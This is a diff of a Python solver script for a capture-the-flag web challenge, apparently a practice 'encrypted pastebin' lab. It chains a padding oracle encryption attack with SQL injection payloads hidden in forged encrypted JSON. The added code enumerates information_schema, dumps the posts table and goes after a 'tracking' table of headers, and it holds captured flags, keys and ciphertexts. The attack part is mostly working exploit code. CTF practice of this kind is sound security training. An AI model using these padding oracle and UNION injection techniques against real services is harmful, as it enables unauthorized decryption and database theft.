@@ -14,7 +14,8 @@
         [x] Padding oracle for encrypt JSON string => got flag 2
         [x] Padding oracle attack to get plain-text of entry with 'id'=1 using post-oracle => Only bit rubbish
         [x] SQL injection in JSON field 'id' : Load file SQL => Could find working path
-        [~] SQL injection in JSON field 'id' : Get all columns of table
+        [x] SQL injection in JSON field 'id' : Get all columns of table => id, title, body
+        [x] Check if body of id=1 changes after restating instancen => Yes, it does!
 
 
 
@@ -230,14 +231,14 @@ def get_flag_2():
     """Get flag 2 with padding oracle encryption attack"""
 
     block_size = 16
-    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
+    data_original = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
     
     # Original plain text etrieved from flag 1
     
     plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
     plain_text_manipulated = '{"id": "1 "}'
 
-    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
+    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_original, block_size=block_size, base_url=base_url, verbose=False)
     cipher_text_encoded = encode_data(cipher_text)
 
     print("Flag 2: " + str.splitlines(evaluate_data(cipher_text_encoded , base_url=base_url ).text.encode("utf-8"))[1] )
@@ -247,15 +248,31 @@ def get_flag_3():
     """Get flag 3 with padding oracle encryption attack and using SQL injection"""
 
     block_size = 16
-    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
+    data_original = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
 
     # Original plain text retrieved from flag 1
     plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
     
-    # This is working! Get content from posts (id, title, body)
-    plain_text_manipulated = '{"id": "1 AND false UNION SELECT group_concat(id,0x3a,title,0x3a,body), \'...\' FROM posts"}'
+    # Body is assigned to '...' as dummy text
+    plain_text_dump_posts = '{"id": "1 AND false UNION SELECT group_concat(id,0x3a,title,0x3a,body), \'...\' FROM posts"}'
+    # Result: Found flag 2
+     
+    plain_text_schema_posts = '{"id": "1 AND false UNION SELECT group_concat(table_schema,0x3a,column_name), \'...\' FROM information_schema.COLUMNS WHERE TABLE_NAME LIKE \'posts\'"}'
+    # Result: level3:id,level3:title,level3:body
+    #         => database 'level3'
 
-    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
+    plain_text_databases = '{"id": "1 AND false UNION SELECT group_concat(DISTINCT table_schema), \'...\' FROM information_schema.TABLES"}'
+    # Result: information_schema,level3,mysql,performance_schema
+    #         => database 'level3'
+
+    plain_text_columns_level3 = '{"id": "1 AND false UNION SELECT group_concat(table_name,0x3a,column_name), \'...\' FROM information_schema.COLUMNS WHERE table_schema LIKE \'level3\'"}'
+    # Result: posts:id,posts:title,posts:body,tracking:id,tracking:headers
+    #         => table 'tracking'
+
+    plain_text_manipulated = '{"id":"1 AND false UNION SELECT group_concat(id,0x3a,headers),\'\' FROM tracking"}'
+    # Result: ????
+
+    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_original, block_size=block_size, base_url=base_url, verbose=False)
     cipher_text_encoded = encode_data(cipher_text)
 
     print("cipher_text: " + cipher_text)
@@ -268,16 +285,21 @@ def test_en_decryptPayload():
     """Testing reverse engineered version of payload decryption"""
 
     # Example message Msg 2
-    key = "wbrIuMEXSYeEFrNgRe5Gsw~~"
-    body = "IpgUTgRRwxo7B-soFR4wFZ5PDkGC2fRjuxEyFwcmkVM~"
+    # Added entry
     plain_text = "Msg #2"
+
+    # Decoded from link
+    key = "wbrIuMEXSYeEFrNgRe5Gsw~~"
+    id = 4
+
+    body = "IpgUTgRRwxo7B-soFR4wFZ5PDkGC2fRjuxEyFwcmkVM~"
     block_size=16
 
     # Decryption
     if decryptPayload(key=key,body=body, block_size=block_size) != plain_text:
         raise Exception("Error occurred! The method 'decryptPayload' does not work as expected.")
 
-        # Encryption
+    # Encryption
     if encryptPayload(key, plain_text, iv=split_into_blocks(decode_data(body), block_size=block_size)[0], block_size=block_size) != body:
         raise Exception("Error occurred! The method 'encryptPayload' does not work as expected.")
 
@@ -289,8 +311,8 @@ if __name__ == "__main__":
     test_un_padding()
     test_en_decryptPayload()
 
-    #get_flag_3()
     #get_flag_0()
     #get_flag_1()
+    #get_flag_2()
     #get_flag_3()
 
